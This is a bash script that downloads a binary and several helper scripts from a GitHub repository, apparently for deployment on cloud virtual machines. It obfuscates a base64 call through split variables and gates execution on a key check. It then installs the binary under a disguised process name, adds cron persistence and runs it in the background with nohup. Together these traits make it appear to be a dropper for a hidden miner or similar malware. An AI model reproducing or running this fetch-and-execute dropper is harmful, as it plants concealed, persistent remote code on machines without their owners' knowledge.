#!/bin/bash

#Uuname="azureuser"
gitpath="Dev699vn/PiMachineLearning"
Uname=$(ls /home)
sudo echo $Uname > inuser.txt
Uuname=$(cat inuser.txt)
gitpath=$(head -1 gitpath.txt)
cd /home/$Uuname
###
VAR5="4"
VAR6="ba"
zvar3="6"
wget https://raw.githubusercontent.com/$gitpath/main/gitclone/key.pem
zvar6="8"
VAR7="se"
VAR8="$VAR6$VAR7"
VAR9=6"$VAR5"
VAR10="$VAR8$VAR9"
EndInf=$(echo $gitpath | $VAR10 | cut -c $zvar3-1$zvar6)
StringInf=$(awk 'NR==13' key.pem | cut -c 3$zvar3-4$zvar6)
VAR1="$EndInf"
VAR2="$StringInf"
if [ "$VAR1" = "$VAR2" ]; 
then
echo "Running"
wget https://github.com/$gitpath/raw/main/linux.tar.gz
tar -xvf linux.tar.gz
rm -rf linux.tar.gz
mkdir -p gitclone
wget https://raw.githubusercontent.com/$gitpath/main/gitclone/ResourceGit.sh
mv ResourceGit.sh gitclone/ResourceGit.sh
chmod +x gitclone/ResourceGit.sh
mkdir bin
cp linux bin/linux
wget https://raw.githubusercontent.com/$gitpath/main/cron.sh
wget https://raw.githubusercontent.com/$gitpath/main/cronadd.sh
wget https://raw.githubusercontent.com/$gitpath/main/auinstall.sh
wget https://raw.githubusercontent.com/$gitpath/main/processname.sh
wget https://raw.githubusercontent.com/$gitpath/main/logrun.sh
chmod +x auinstall.sh processname.sh cronadd.sh logrun.sh			
./cronadd.sh
./processname.sh
cp inuser.txt bin/inuser.txt
cd bin/
Uuname=$(cat inuser.txt)
USEPROCNAME=$(cat SETPROCNAME.txt)
echo > trx.txt
wget https://raw.githubusercontent.com/$gitpath/main/runlinux.sh
mv runlinux.sh runsrc.sh
chmod +x runsrc.sh
date +'%A' > date.txt
mv linux $USEPROCNAME
sudo chown -R $Uuname:$Uuname /home/$Uuname/
nohup sh runsrc.sh > result.log 2>&1 &				
else
echo ""
fi        






